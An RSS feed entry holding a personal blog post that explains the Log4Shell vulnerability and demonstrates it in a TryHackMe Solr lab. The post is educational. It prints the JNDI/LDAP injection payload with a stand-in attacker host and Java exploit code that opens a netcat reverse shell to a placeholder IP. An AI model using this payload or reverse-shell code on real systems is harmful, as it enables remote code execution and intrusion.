<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Somesh&#39;s Blog</title>
    <link>https://somesh-banerjee.github.io/blogs/posts/</link>
    <description>Recent content in Posts on Somesh&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 14 Jan 2022 17:25:22 +0530</lastBuildDate><atom:link href="https://somesh-banerjee.github.io/blogs/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Log4shell</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/log4shell/</link>
      <pubDate>Fri, 14 Jan 2022 17:25:22 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
      <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
logging.WARN(&amp;quot;warning&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.&lt;/li&gt;
&lt;li&gt;The first ATTACKER-SERVER then points to another attacker controlled server which is hosting a malicious Java code.&lt;/li&gt;
&lt;li&gt;The victim requests the malicious code and executes it, leading to RCE.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The process can be visualized with the following figure by &lt;a href=&#34;https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/&#34;&gt;GovCERT&lt;/a&gt;
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list &lt;a href=&#34;https://github.com/YfryTchsGD/Log4jAttackSurface&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h1&gt;
&lt;p&gt;We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.&lt;/p&gt;
&lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The code just sends a reverse shell to the attacker.&lt;/p&gt;
&lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The CVE have been patched in log4j update by disabling jndi by default. &lt;a href=&#34;https://log4shell.huntress.com/&#34;&gt;HuntresLabs scanner&lt;/a&gt; can be used to check for Log4Shell vulnerability in your app.&lt;/p&gt;
&lt;p&gt;Some of the resources I used to learn about this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&#34;&gt;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&#34;&gt;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;TryHackMe - Solar, exploiting log4j Room&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
